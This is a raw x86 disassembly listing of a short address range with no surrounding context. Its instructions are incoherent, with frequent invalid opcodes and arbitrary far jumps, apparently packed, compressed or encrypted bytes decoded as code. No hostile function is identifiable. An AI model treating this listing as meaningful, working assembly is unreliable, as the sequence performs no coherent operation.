  4182e4:	sbb    BYTE PTR [ebp+0xb],ah
  4182e7:	out    dx,al
  4182e8:	xor    al,0x5b
  4182ea:	(bad)  
  4182eb:	hlt    
  4182ec:	inc    esi
  4182ed:	inc    eax
  4182ee:	es push cs
  4182f0:	adc    BYTE PTR [edx-0x293e4072],0xaa
  4182f7:	sub    DWORD PTR [edi+0x1],eax
  4182fa:	(bad)  
  4182fb:	inc    DWORD PTR [eax+0x74bdf4b5]
  418301:	je     0x418360
  418303:	popf   
  418304:	fnsave [eax+0x6327a98e]
  41830a:	popf   
  41830b:	mov    ah,0x7b
  41830d:	pop    es
  41830e:	sbb    BYTE PTR [ebx+0x2c580632],0x1c
  418315:	aaa    
  418316:	mov    edi,0x49a56912
  41831b:	jg     0x418356
  41831d:	in     al,0xa
  41831f:	lods   al,BYTE PTR ds:[esi]
  418320:	xchg   DWORD PTR [ebx],ecx
  418322:	and    edi,DWORD PTR [ebx+0x2d]
  418325:	sbb    al,0xd2
  418327:	pop    esp
  418328:	push   ds
  418329:	xchg   ebp,eax
  41832a:	add    eax,0x90ec1246
  41832f:	push   esp
  418330:	ds aaa 
  418332:	in     al,0x17
  418334:	add    bl,BYTE PTR [ecx-0x3477f73c]
  41833a:	mov    ds:0x791cb098,al
  41833f:	into   
  418340:	inc    esi
  418341:	push   edx
  418342:	pop    ecx
  418343:	cmp    al,0x25
  418345:	enter  0xf3e0,0x4d
  418349:	mov    cl,0x1c
  41834b:	mov    ds:0xad477f6a,al
  418350:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418351:	push   edx
  418352:	or     BYTE PTR [esi-0x27],bl
  418355:	and    eax,0x882d01e1
  41835a:	mov    al,ds:0x2bfa1715
  41835f:	aam    0x97
  418361:	call   0x8f2b5a21
  418366:	adc    eax,0x218d26c1
  41836b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41836c:	dec    esi
  41836d:	ficom  WORD PTR [ecx+0x3b]
  418370:	xor    ebx,DWORD PTR [ecx]
  418372:	cmp    eax,0xbdc053b9
  418377:	pop    es
  418378:	mov    bh,0xbf
  41837a:	add    BYTE PTR ds:0xf099ec33,bh
  418380:	outs   dx,DWORD PTR ds:[esi]
  418381:	fild   WORD PTR [ecx+ecx*8+0x7dd8f992]
  418388:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418389:	shl    BYTE PTR [ecx+ebp*4-0x27],0xab
  41838e:	xchg   ebp,eax
  41838f:	sub    bl,BYTE PTR [esi+0x2d]
  418392:	inc    ecx
  418393:	xor    BYTE PTR [ecx+0x1071374f],bh
  418399:	cmp    BYTE PTR [edi+0x1eddb8bd],dl
  41839f:	pop    ebx
  4183a0:	loopne 0x41835d
  4183a2:	mov    edx,0x43ae4b6a
  4183a7:	imul   esi,eax,0xffffff8f
  4183aa:	and    dh,dh
  4183ac:	scas   al,BYTE PTR es:[edi]
  4183ad:	stc    
  4183ae:	mov    edi,DWORD PTR [ebp+0x7e]
  4183b1:	lea    ecx,[eax-0xa]
  4183b4:	or     BYTE PTR [eax+esi*1+0x5c3f7a8b],dl
  4183bb:	sti    
  4183bc:	(bad)  
  4183bd:	repnz adc ebp,DWORD PTR [eax]
  4183c0:	adc    DWORD PTR [eax+0xc],edx
  4183c3:	shl    DWORD PTR [ebx],1
  4183c5:	add    bh,BYTE PTR [eax]
  4183c7:	add    al,0xab
  4183c9:	mov    dl,0x70
  4183cb:	repnz addr16 mov ch,0x42
  4183cf:	push   es
  4183d0:	dec    edx
  4183d1:	jb     0x418407
  4183d3:	adc    ah,dh
  4183d5:	ret    
  4183d6:	scas   al,BYTE PTR es:[edi]
  4183d7:	cs addr16 cwde 
  4183da:	icebp  
  4183db:	lods   al,BYTE PTR ds:[esi]
  4183dc:	add    DWORD PTR [eax+0x45b53459],0xffffffb7
  4183e3:	add    DWORD PTR ds:0x9852cc52,eax
  4183e9:	mov    ebp,0x89ef9cd4
  4183ee:	mov    bl,0x4
  4183f0:	enter  0x5790,0x71
  4183f4:	xchg   edx,eax
  4183f5:	push   ds
  4183f6:	cmp    al,0xd1
  4183f8:	cmp    edi,0x753ddfa8
  4183fe:	fist   DWORD PTR [ebp-0x57]
  418401:	int3   
  418402:	adc    dh,BYTE PTR [ecx+ebx*1+0x3c46484e]
  418409:	fisubr DWORD PTR [ebp-0xe]
  41840c:	mov    eax,ds:0x6a645d12
  418411:	pop    edx
  418412:	mov    ds:0xe4dc7539,eax
  418417:	xchg   BYTE PTR [ecx-0x4a],ch
  41841a:	sbb    DWORD PTR es:[edi],0xcf9300c
  418421:	out    0xae,al
  418423:	dec    edi
  418424:	cdq    
  418425:	push   eax
  418426:	lea    esp,[edi+0x70]
  418429:	fisttp QWORD PTR [ecx+0x9f46a11]
  41842f:	popa   
  418430:	adc    esp,ebp
  418432:	addr16 (bad) 
  418434:	sbb    DWORD PTR [ecx],0x485d097b
  41843a:	push   ds
  41843b:	push   es
  41843c:	int3   
  41843d:	jge    0x41845e
  41843f:	fwait
  418440:	or     ebx,DWORD PTR [edi]
  418442:	pop    es
  418443:	inc    eax
  418444:	mov    edx,DWORD PTR [ebp+0xa]
  418447:	sbb    al,0x8e
  418449:	(bad)  
  41844a:	jecxz  0x41840c
  41844c:	sbb    dl,BYTE PTR [eax]
  41844e:	imul   edi,DWORD PTR [ecx+0x4727f5e7],0x8925646c
  418458:	inc    ebp
  418459:	inc    eax
  41845a:	in     eax,dx
  41845b:	pop    esp
  41845c:	shl    DWORD PTR [edx-0x4939fe4b],1
  418462:	jno    0x4184be
  418464:	pop    edx
  418465:	popa   
  418466:	add    DWORD PTR [edi+0x64],0x2c
  41846a:	cld    
  41846b:	push   esi
  41846c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41846d:	push   ebp
  41846e:	clc    
  41846f:	adc    eax,DWORD PTR [edi+ecx*4-0x7af43180]
  418476:	mov    esi,0x79083bd3
  41847b:	pop    ds
  41847c:	clc    
  41847d:	mov    ds:0xec21ed8b,eax
  418482:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418483:	mov    ebp,0xa757334c
  418488:	adc    BYTE PTR [ebp+edx*8+0x54],bl
  41848c:	int    0xec
  41848e:	fist   DWORD PTR [esi+0x55a05188]
  418494:	jnp    0x418468
  418496:	test   DWORD PTR [ebx-0x54],edi
  418499:	push   ds
  41849a:	adc    bh,BYTE PTR [edi+eax*1+0x23]
  41849e:	sub    eax,0x56db8c5d
  4184a3:	xchg   ecx,eax
  4184a4:	fild   QWORD PTR fs:[edi+eax*1-0x74]
  4184a9:	scas   al,BYTE PTR es:[edi]
  4184aa:	dec    edi
  4184ab:	mov    ch,0x4d
  4184ad:	nop
  4184ae:	leave  
  4184af:	pop    eax
  4184b0:	fnsave [edi-0x79]
  4184b3:	pop    esp
  4184b4:	add    DWORD PTR [edx+0x4282281c],ebx
  4184ba:	xchg   ecx,edx
  4184bc:	adc    al,0xa1
  4184be:	fimul  WORD PTR [edi]
  4184c0:	jmp    0x178a:0x5be80388
  4184c7:	out    0x8a,eax
  4184c9:	mov    WORD PTR [ebx],es
  4184cb:	add    al,0x22
  4184cd:	xchg   edi,eax
  4184ce:	loop   0x418513
  4184d0:	ja     0x41847d
  4184d2:	stos   DWORD PTR es:[edi],eax
  4184d3:	fistp  WORD PTR [ecx]
  4184d5:	cmp    eax,0x2aa63fb7
  4184da:	sub    BYTE PTR [edx+0x4d05cb22],dl
  4184e0:	jl     0x418527
  4184e2:	ss pop esp
  4184e4:	pop    edx
  4184e5:	aam    0x36
  4184e7:	dec    eax
  4184e8:	pop    ecx
  4184e9:	mov    ah,0xbc
  4184eb:	mov    edx,0xf77dac38
  4184f0:	or     esp,DWORD PTR [ebx+0x1c7bb9e6]
  4184f6:	inc    esi
  4184f7:	jge    0x41849a
  4184f9:	in     al,0x1c
  4184fb:	imul   ebx,DWORD PTR [eax],0x9b2b881e
  418501:	lods   eax,DWORD PTR ds:[esi]
  418502:	add    al,0x51
  418504:	adc    ah,BYTE PTR ds:0x2c4e5900
  41850a:	(bad)  
  41850b:	dec    esp
  41850c:	hlt    
  41850d:	push   0x5517125d
  418512:	or     eax,0xd0f0237f
  418517:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418518:	sub    al,0xf7
  41851a:	jg     0x418546
  41851c:	(bad)  
  41851d:	mov    ch,0xec
  41851f:	adc    bh,BYTE PTR [ebx+0x2e2c8f]
  418525:	adc    eax,0xa8c05c4d
  41852a:	dec    eax
  41852b:	ss inc ecx
  41852d:	xlat   BYTE PTR ds:[ebx]
  41852e:	xchg   DWORD PTR ds:0x5bf29e0b,esi
  418534:	pop    ss
  418535:	shl    BYTE PTR [edx+0xd191673],cl
  41853b:	or     eax,0xf45497de
  418540:	icebp  
  418541:	mov    al,0x5c
  418543:	dec    esi
  418544:	(bad)
  418548:	lds    eax,FWORD PTR [edi-0x3d]
  41854b:	mov    bl,0x3b
  41854d:	aam    0xe
  41854f:	icebp  
  418550:	mov    esi,DWORD PTR [esi]
  418552:	cld    
  418553:	mov    es,WORD PTR [edx+ecx*2]
  418556:	enter  0xa398,0x1b
  41855a:	retf   0xc0b7
  41855d:	inc    esi
  41855e:	mov    bh,0x1d
  418560:	xlat   BYTE PTR ds:[ebx]
  418561:	out    dx,eax
  418562:	mov    ebx,0x52bfc3
  418567:	pop    ecx
  418568:	push   0xf15ba917
  41856d:	mov    edx,0x367303
  418572:	sbb    BYTE PTR [ecx-0x10],cl
  418575:	fbld   TBYTE PTR [esi+edx*8+0x540d83b9]
  41857c:	mov    ds:0x96bf94e3,eax
  418581:	add    eax,DWORD PTR [eax+0x10]
  418584:	mov    ah,0x83
  418586:	neg    DWORD PTR [ebp-0x2391833c]
  41858c:	cli    
  41858d:	int    0xb
  41858f:	xchg   edx,eax
  418590:	push   esp
  418591:	xchg   BYTE PTR [ecx],bl
  418593:	fidiv  DWORD PTR [edx]
  418595:	mov    esp,0x94d3dd3b
  41859a:	jge    0x4185cd
  41859c:	pop    ecx
  41859d:	int3   
  41859e:	xor    DWORD PTR [esi+eiz*1],0xffffffa0
  4185a2:	cmp    DWORD PTR [edx],ebp
  4185a4:	inc    edi
  4185a5:	stc    
  4185a6:	mov    esp,0xfbb2f7c2
  4185ab:	pop    edi
  4185ac:	lea    ecx,[edx+0xf]
  4185af:	mov    bl,al
  4185b1:	stc    
  4185b2:	out    0x2,eax
  4185b4:	repnz clc 
  4185b6:	dec    edi
  4185b7:	mov    ebp,0xe40ee454
  4185bc:	push   0xe0f8e420
  4185c1:	pop    edx
  4185c2:	mov    ch,0xb3
  4185c4:	in     eax,dx
  4185c5:	mov    BYTE PTR [ebp-0xd],ah
  4185c8:	fisttp WORD PTR [si-0x45]
  4185cc:	mov    ebp,es
  4185ce:	push   es
  4185cf:	jcxz   0x418556
  4185d2:	sar    DWORD PTR [edx-0x6fffeada],0x67
  4185d9:	fmul   DWORD PTR [ebp+0x3c363033]
  4185df:	inc    edi
  4185e0:	push   0x9e54b030
  4185e5:	pop    ebx
  4185e6:	push   cs
  4185e7:	mov    bl,BYTE PTR [eax+0x5e]
  4185ea:	and    BYTE PTR [ebx+0x707d0b61],ch
  4185f0:	inc    eax
  4185f1:	clc    
  4185f2:	cwde   
  4185f3:	jmp    0x418632
  4185f5:	test   BYTE PTR [esi-0x29],cl
  4185f8:	xchg   esi,eax
  4185f9:	ins    BYTE PTR es:[edi],dx
  4185fa:	mov    ch,0xaf
  4185fc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4185fd:	xor    edi,ebp
  4185ff:	inc    esi
  418600:	jp     0x4185fc
  418602:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418603:	test   al,0x8b
  418605:	sub    BYTE PTR [ebx-0x1],bh
  418608:	mov    DWORD PTR [eax-0x7b0693bc],edx
  41860e:	rcr    bp,cl
  418611:	shl    DWORD PTR [eax-0x4ee56ade],cl
  418617:	dec    eax
  418618:	cmp    al,0x5a
  41861a:	stc    
  41861b:	push   ss
  41861c:	sahf   
  41861d:	sub    dh,BYTE PTR [esp+eax*2+0x3a05233e]
  418624:	mov    eax,0x16a77e65
  418629:	out    dx,al
  41862a:	leave  
  41862b:	mov    esp,0x91bb1faa
  418630:	test   DWORD PTR [esp+ecx*8+0x50],ecx
  418634:	xor    eax,DWORD PTR [ebx-0x6b1c7097]
  41863a:	jne    0x41860b
  41863c:	sub    eax,0xa84a5652
  418641:	ret    0x672b
  418644:	inc    esi
  418645:	pop    esi
  418646:	enter  0x9803,0x2f
  41864a:	repnz or dl,BYTE PTR es:[ebx-0x29]
  41864f:	or     edi,DWORD PTR [ebx+0x101282bd]
  418655:	sar    BYTE PTR [esi+0x5bc31b6],cl
  41865b:	mov    BYTE PTR [ebx],0x77
  41865e:	(bad)  
  41865f:	fidivr WORD PTR [ebx-0x5a6fdfdb]
  418665:	jle    0x418605
  418667:	and    eax,0x20bee5a0
  41866c:	gs push ebx
  41866e:	or     BYTE PTR [ecx+0x6e],al
  418671:	xchg   DWORD PTR [eax+0x5a],esi
  418674:	sub    ecx,0x60
  418677:	mov    esi,0x6a760743
  41867c:	mov    ch,0x4d
  41867e:	jmp    0xe1b1:0xd02dc9a8
  418685:	jg     0x418612
  418687:	mov    eax,DWORD PTR [edx+ecx*8+0x52]
  41868b:	sub    bl,dl
  41868d:	dec    edi
  41868e:	shr    BYTE PTR [ecx-0x40],1
  418691:	iret   
  418692:	addr16 mov edi,0x27ced260
  418698:	and    DWORD PTR ds:0x18e047f0,edx
  41869e:	out    0xb4,eax
  4186a0:	sub    BYTE PTR [edx-0x656db0f9],cl
  4186a6:	jmp    DWORD PTR [ecx+0x6d]
  4186a9:	scas   al,BYTE PTR es:[edi]
  4186aa:	call   0x38f:0xd02c8a33
  4186b1:	int    0xea
  4186b3:	pop    ebp
  4186b4:	xchg   ebp,eax
  4186b5:	and    esi,DWORD PTR [ebp-0x4e]
  4186b8:	mov    ah,0xa9
  4186ba:	push   ecx
  4186bb:	and    al,0x40
  4186bd:	js     0x4186f9
  4186bf:	jb     0x41871e
  4186c1:	out    0x34,al
  4186c3:	mov    bl,0x1c
  4186c5:	ficom  WORD PTR [edx+0x70]
  4186c8:	sbb    dl,ch
  4186ca:	je     0x4186e2
  4186cc:	add    eax,0xa6f5bb4f
  4186d1:	aam    0x73
  4186d3:	mov    al,0x7f
  4186d5:	pop    ecx
  4186d6:	stos   BYTE PTR es:[edi],al
  4186d7:	mov    al,0xa0
  4186d9:	std    
  4186da:	push   0xd07eb8be
  4186df:	ds jg  0x41875a
  4186e2:	xor    BYTE PTR [esi],0xd5
  4186e5:	retf   0x8e8c
  4186e8:	pop    edi
  4186e9:	mov    esi,0xd5731f55
  4186ee:	mov    al,0xac
  4186f0:	out    dx,al
  4186f1:	mov    cl,0x5d
  4186f3:	mov    bh,0x99
  4186f5:	rcr    BYTE PTR [ebx+ecx*1+0x635797fd],cl
  4186fc:	in     eax,0xcb
  4186fe:	gs pop esp
  418700:	in     al,dx
  418701:	js     0x418694
  418703:	xchg   edx,eax
  418704:	enter  0xe420,0xf1
  418708:	mov    eax,ecx
  41870a:	dec    eax
  41870b:	jnp    0x4186a0
  41870d:	call   0x60c72485
  418712:	fimul  WORD PTR ds:0x6ce5062
  418718:	in     al,0xf
  41871a:	ficomp DWORD PTR [ecx+ecx*2-0x7e]
  41871e:	inc    edi
  41871f:	ret    0x575e
  418722:	pop    ds
  418723:	test   esi,ebx
  418725:	scas   eax,DWORD PTR es:[edi]
  418726:	cs jg  0x418742
  418729:	mov    al,0x3
  41872b:	and    al,0x1f
  41872d:	pop    eax
  41872e:	(bad)  
  418730:	pop    esp
  418731:	xchg   edi,eax
  418732:	mov    edi,0x250112cb
  418737:	(bad)  
  418738:	sti    
  418739:	jbe    0x418761
  41873b:	and    DWORD PTR [ebp+eax*8+0x7fe3f3d7],eax
  418742:	hlt    
  418743:	ins    DWORD PTR es:[edi],dx
  418744:	xchg   DWORD PTR [edi],edx
  418746:	data16 cld 
  418748:	pop    esi
  418749:	add    ebp,DWORD PTR ds:0x7028a14e
  41874f:	xchg   eax,ebx
  418751:	ret    
  418752:	mov    edi,0xe4cdc1d8
  418757:	pop    ecx
  418758:	fwait
  418759:	and    ebp,DWORD PTR [esi+esi*8+0x3ad0472f]
  418760:	or     esp,DWORD PTR [esi+esi*1-0x1b9ed411]
  418767:	sub    al,0x9c
  418769:	sbb    dl,BYTE PTR [ebx+0x6f]
  41876c:	fwait
  41876d:	scas   eax,DWORD PTR es:[edi]
  41876e:	jg     0x41872b
  418770:	imul   ah
  418772:	dec    esi
  418773:	lds    edi,FWORD PTR [edi]
  418775:	jle    0x418746
  418777:	mov    ah,0x5d
  418779:	fwait
  41877a:	sbb    ebx,0x7e5de4ec
  418780:	jl     0x41874a
  418782:	pop    esp
  418783:	push   0xffffffa1
  418785:	xor    eax,0x57cdf3a8
  41878a:	sub    ebp,edi
  41878c:	imul   eax,DWORD PTR [ebp+0x47],0x55
  418790:	push   cs
  418791:	aaa    
  418792:	cs pop es
  418794:	sbb    eax,DWORD PTR [ebp+0x1a]
  418797:	jge    0x418752
  418799:	xor    bh,BYTE PTR [edx+0x76]
  41879c:	add    ah,BYTE PTR [edx]
  41879e:	mov    ch,bh
  4187a0:	(bad)  
  4187a1:	mov    esp,0xb1fe4b62
  4187a6:	xchg   edi,eax
  4187a7:	sbb    DWORD PTR [edi],0xffffffd5
  4187aa:	push   esi
  4187ab:	fiadd  WORD PTR [ebx]
  4187ad:	xchg   DWORD PTR [ebp+0x61],esi
  4187b0:	idiv   BYTE PTR [edx+edx*4-0x3]
  4187b4:	pop    ds
  4187b5:	inc    edx
  4187b6:	int    0x5f
  4187b8:	test   DWORD PTR [esi-0x263a3836],edi
  4187be:	sub    ah,al
  4187c0:	xchg   ah,ah
  4187c2:	push   ebp
  4187c3:	arpl   WORD PTR [ecx-0x54],ax
  4187c6:	mov    BYTE PTR [esi-0x4],bl
  4187c9:	cmp    eax,0x705ffef0
  4187ce:	aaa    
  4187cf:	outs   dx,BYTE PTR ds:[esi]
  4187d0:	dec    esi
  4187d1:	fwait
  4187d2:	out    0x20,eax
  4187d4:	mov    eax,0x97c04c5d
  4187d9:	inc    edi
  4187da:	bound  edi,QWORD PTR [eax-0x19]
  4187dd:	xchg   ebp,eax
  4187de:	mov    WORD PTR [eax+0x2e29618e],ss
  4187e4:	das    
  4187e5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4187e6:	nop
  4187e7:	imul   esi,DWORD PTR [edi],0x59d84d00
  4187ed:	test   edx,0x68a84a81
  4187f3:	gs jb  0x418826
  4187f6:	add    esi,DWORD PTR [edx]
  4187f8:	aas    
  4187f9:	frstor [ecx-0x7123b45f]
  4187ff:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418800:	jecxz  0x4187c5
  418802:	or     eax,0xd0d7311a
  418807:	lock adc DWORD PTR [edi-0x7b],ebx
  41880b:	lahf   
  41880c:	adc    cl,cl
  41880e:	dec    edx
  41880f:	xchg   edi,eax
  418810:	mov    eax,ecx
  418812:	push   0x7acc09d6
  418817:	mov    eax,ds:0xeb65cebe
  41881c:	ret    
  41881d:	in     eax,0xc6
  41881f:	push   ecx
  418820:	jg     0x41887f
  418822:	mov    dl,BYTE PTR [edx+eiz*8-0x15]
  418826:	xchg   DWORD PTR [ecx+0x30],edi
  418829:	push   es
  41882a:	mov    edi,0x37b4756c
  41882f:	sub    ecx,DWORD PTR [ebx+0x5860b8d6]
  418835:	test   al,0x32
  418837:	mov    ds:0x386b0cd9,eax
  41883c:	loopne 0x4187f4
  41883e:	lods   al,BYTE PTR ds:[esi]
  41883f:	retf   
  418840:	repnz sub esi,DWORD PTR [edi+0x71]
  418844:	fsub   DWORD PTR [esi+0x2cbb9edc]
  41884a:	out    0xa0,al
  41884c:	or     al,0x2d
  41884e:	jg     0x418858
  418850:	dec    edx
  418851:	jmp    0xd9096979
  418856:	and    eax,0xc905e097
  41885b:	jae    0x41886a
  41885d:	outs   dx,BYTE PTR ds:[esi]
  41885e:	or     dl,ah
  418860:	icebp  
  418861:	cmp    BYTE PTR [eax+0x60],ch
  418864:	cmc    
  418865:	dec    esi
  418866:	and    ah,BYTE PTR [ebx-0x38]
  418869:	ror    BYTE PTR [ebx-0x5c454bf],cl
  41886f:	inc    esi
  418870:	je     0x41887e
  418872:	and    ch,dh
  418874:	int3   
  418875:	pop    ds
  418876:	jecxz  0x418895
  418878:	mov    dh,0xf0
  41887a:	jmp    0x4188ee
  41887c:	outs   dx,BYTE PTR ds:[esi]
  41887d:	outs   dx,BYTE PTR ds:[esi]
  41887e:	jecxz  0x4188ab
  418880:	icebp  
  418881:	cdq    
  418882:	push   0xa4f02782
  418887:	lods   eax,DWORD PTR ds:[esi]
  418888:	(bad)  
  418889:	aaa    
  41888a:	imul   ecx,DWORD PTR ds:0xdb752e08,0xd28b572a
  418894:	lods   eax,DWORD PTR ds:[esi]
  418895:	das    
  418896:	add    eax,0xf98b1c34
  41889b:	mov    esi,0x82e29dfb
  4188a0:	dec    edi
  4188a1:	or     al,0x80
  4188a3:	sub    bl,BYTE PTR [eax+0x71237592]
  4188a9:	out    0x5,eax
  4188ab:	sub    eax,0x3d28d1cf
  4188b0:	sar    DWORD PTR [ebx],0x87
  4188b3:	xchg   ecx,eax
  4188b4:	mov    al,ds:0xb6ecf09a
  4188b9:	std    
  4188ba:	mov    ecx,DWORD PTR [ecx+ecx*4]
  4188bd:	and    bl,cl
  4188bf:	push   es
  4188c0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4188c1:	dec    esp
  4188c2:	and    ah,BYTE PTR [edi-0xa]
  4188c5:	xor    eax,0xcc70d38a
  4188ca:	lods   al,BYTE PTR ds:[esi]
  4188cb:	stc    
  4188cc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4188cd:	test   DWORD PTR [ecx+0x2],edi
  4188d0:	inc    ebx
  4188d1:	add    eax,0x1bb137e5
  4188d6:	test   eax,0x681b8a66
  4188db:	scas   eax,DWORD PTR es:[edi]
  4188dc:	jnp    0x4188dd
  4188de:	inc    edi
  4188df:	pop    ebp
  4188e0:	in     eax,dx
  4188e1:	xchg   esi,eax
  4188e2:	and    bl,dl
  4188e4:	out    0xe5,al
  4188e6:	loop   0x418932
  4188e8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4188e9:	pop    ebp
  4188ea:	mov    cl,BYTE PTR [esi]
  4188ec:	call   0x632fcdc4
  4188f1:	dec    ebx
  4188f2:	inc    edx
  4188f3:	je     0x4188f1
  4188f5:	cmp    al,0x24
  4188f7:	(bad)  
  4188f8:	(bad)  
  4188fa:	pop    ss
  4188fb:	dec    esp
  4188fc:	xor    DWORD PTR [ecx-0x27],eax
  4188ff:	mov    ds:0xd55cec1d,eax
  418904:	push   esp
  418905:	cmc    
  418906:	mov    esp,0x483b5f3e
  41890b:	or     eax,0x9bb3c359
  418910:	mov    BYTE PTR [ebp-0x7f],ch
  418913:	add    eax,ecx
  418915:	inc    eax
  418916:	shr    cl,1
  418918:	jl     0x418994
  41891a:	pusha  
  41891b:	test   DWORD PTR [ecx],esp
  41891d:	xchg   edx,eax
  41891e:	sbb    DWORD PTR [ecx+0x7d],0xaa49039c
  418925:	fwait
  418926:	xchg   ebp,eax
  418927:	sub    bl,al
  418929:	(bad)  [edi+0x6d4baf96]
  41892f:	and    al,0x58
  418931:	mov    dl,0x70
  418933:	aam    0xcb
  418935:	addr16 in al,dx
  418937:	cwde   
  418938:	mov    ?,ebx
  41893a:	jmp    0x89ae:0x3aec4040
  418941:	add    bl,BYTE PTR [esi+eiz*4-0x67]
  418945:	fs inc esi
  418947:	std    
  418948:	mov    esi,0x99b4e30e
  41894d:	repnz sbb al,0x8
  418950:	xchg   esp,eax
  418951:	dec    ecx
  418952:	int3   
  418953:	test   DWORD PTR [edx],esi
  418955:	xor    eax,0xad6d9dc1
  41895a:	les    esi,FWORD PTR [ebp+0x70]
  41895d:	call   0x7e80:0xc98ba66e
  418964:	dec    ebx
  418965:	adc    al,0xe3
  418967:	(bad)  
  418968:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418969:	pop    edx
  41896a:	add    bl,ah
  41896c:	inc    ebp
  41896d:	dec    ebx
  41896e:	test   esp,0x4ea6c4fc
  418974:	outs   dx,BYTE PTR ds:[esi]
  418975:	mov    ds:0x5f1abf83,al
  41897a:	push   ss
  41897b:	push   0xca622d81
  418980:	daa    
  418981:	lods   eax,DWORD PTR ds:[esi]
  418982:	sbb    eax,0x163d3424
  418987:	jl     0x41894d
  418989:	dec    edi
  41898a:	cmp    eax,0x478b31c6
  41898f:	mov    BYTE PTR [esi],al
  418991:	xchg   esp,eax
  418992:	cmp    eax,DWORD PTR [esi-0x4f]
  418995:	fadd   st,st(1)
  418997:	clc    
  418998:	leave  
  418999:	lock nop
  41899b:	(bad)  
  41899c:	fld    QWORD PTR [ebp+0x13582eee]
  4189a2:	fucomp st(1)
  4189a4:	shl    DWORD PTR [edi],1
  4189a6:	fs adc eax,esi
  4189a9:	adc    al,0xdd
  4189ab:	mov    eax,ds:0xe276d5a6
  4189b0:	mov    ah,0x9f
  4189b2:	cmp    BYTE PTR [edi+0x434c7448],ah
  4189b8:	mov    ebp,0x7abb595d
  4189bd:	dec    esi
  4189be:	cmp    DWORD PTR [edi-0x55],ecx
  4189c1:	jl     0x418998
  4189c3:	mov    cl,0xe6
  4189c5:	adc    DWORD PTR [ebx-0x19],edx
  4189c8:	ins    DWORD PTR es:[edi],dx
  4189c9:	push   ecx
  4189ca:	xchg   ebp,eax
  4189cb:	test   DWORD PTR [eax-0x5439ef8e],esp
  4189d1:	popf   
  4189d2:	mov    ah,BYTE PTR [ecx]
  4189d4:	dec    esi
  4189d5:	dec    ebp
  4189d6:	xor    al,0x9
  4189d8:	mov    dh,0x6b
  4189da:	cmp    al,0x56
  4189dc:	dec    edx
  4189dd:	jne    0x4189af
  4189df:	hlt    
  4189e0:	and    ah,BYTE PTR [edi]
  4189e2:	div    BYTE PTR [eax+0x4654be25]
  4189e8:	sbb    eax,0x615b1dd6
  4189ed:	push   cs
  4189ee:	xchg   esp,eax
  4189ef:	mov    ch,0x17
  4189f1:	lea    esp,[ebx+0x29]
  4189f4:	jne    0x418a5f
  4189f6:	retf   0x9c29
  4189f9:	xchg   ebp,eax
  4189fa:	jb     0x4189ba
  4189fc:	call   0xf128:0xf419a8bd
  418a03:	sbb    DWORD PTR [edi+0x60],esp
  418a06:	jl     0x41898e
  418a08:	dec    ecx
  418a09:	lds    ebp,FWORD PTR [eax+0x6f]
  418a0c:	sbb    eax,0x7a2481c3
  418a11:	test   BYTE PTR [edx],al
  418a13:	inc    ecx
  418a14:	push   edi
  418a15:	(bad)  
  418a17:	in     ax,dx
  418a19:	sub    dl,dl
  418a1b:	cmp    DWORD PTR [ecx],0xdb427573
  418a21:	mov    ecx,0x144fb15b
  418a26:	outs   dx,BYTE PTR ds:[esi]
  418a27:	cld    
  418a28:	nop
  418a29:	test   eax,0x9249b91a
  418a2e:	mov    al,ds:0x8cd4e4c3
  418a33:	sub    esi,DWORD PTR [edx-0x3d4e945a]
  418a39:	fldcw  WORD PTR [ebx]
  418a3b:	imul   esp,DWORD PTR [ecx-0x3b81990],0x58
  418a42:	jg     0x418aaf
  418a44:	inc    esi
  418a45:	test   BYTE PTR ds:0x76030a78,dl
  418a4b:	out    dx,eax
  418a4c:	push   eax
  418a4d:	mov    ah,0xbc
  418a4f:	pusha  
  418a50:	mov    al,0xec
  418a52:	outs   dx,DWORD PTR ds:[esi]
  418a53:	or     ch,BYTE PTR [ebp-0xe]
  418a56:	popa   
  418a57:	fwait
  418a58:	cli    
  418a59:	cmc    
  418a5a:	sub    BYTE PTR [edx],al
  418a5c:	jns    0x4189e5
  418a5e:	loop   0x418a97
  418a60:	jne    0x418a84
  418a62:	and    al,0x8c
  418a64:	add    eax,0x8beca84f
  418a69:	stc    
  418a6a:	add    dh,BYTE PTR [ebp+eiz*1-0x3619f7b7]
  418a71:	mov    ebp,0x3700d5f8
  418a76:	push   edi
  418a77:	sahf   
  418a78:	or     DWORD PTR [eax],ebp
  418a7a:	sbb    al,0x4f
  418a7c:	vpunpckhdq xmm1,xmm4,XMMWORD PTR [eax-0x58]
  418a81:	outs   dx,BYTE PTR ds:[esi]
  418a82:	mov    bh,0x94
  418a84:	clc    
  418a85:	test   BYTE PTR [edi+0x47],al
  418a88:	in     al,0xdb
  418a8a:	cmp    dl,BYTE PTR [edx+0x42]
  418a8d:	sub    ebp,esp
  418a8f:	mov    ah,0x65
  418a91:	leave  
  418a92:	mov    BYTE PTR [ebp-0x3a7da73],cl
  418a98:	push   edx
  418a99:	and    esi,ebp
  418a9b:	loope  0x418a41
  418a9d:	mov    edi,0x814318d7
  418aa2:	idiv   DWORD PTR [edx+0x54]
  418aa5:	dec    esi
  418aa6:	and    dl,BYTE PTR [edx]
  418aa8:	mov    ebp,DWORD PTR [edi]
  418aaa:	ss push ds
  418aac:	add    DWORD PTR [edx-0x5fe8d520],esp
  418ab2:	push   cs
  418ab3:	inc    edi
  418ab4:	sbb    edx,ebx
  418ab6:	push   eax
  418ab7:	xchg   ebp,eax
  418ab8:	int3   
  418ab9:	add    eax,0x6294d4ac
  418abe:	dec    ebp
  418abf:	and    eax,0x88233b9b
  418ac4:	retf   0x941
  418ac7:	cmp    BYTE PTR [edi+0x7e],0xe8
  418acb:	call   0x5f794c24
  418ad0:	xchg   edx,eax
  418ad1:	sbb    esi,esi
  418ad3:	lock cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
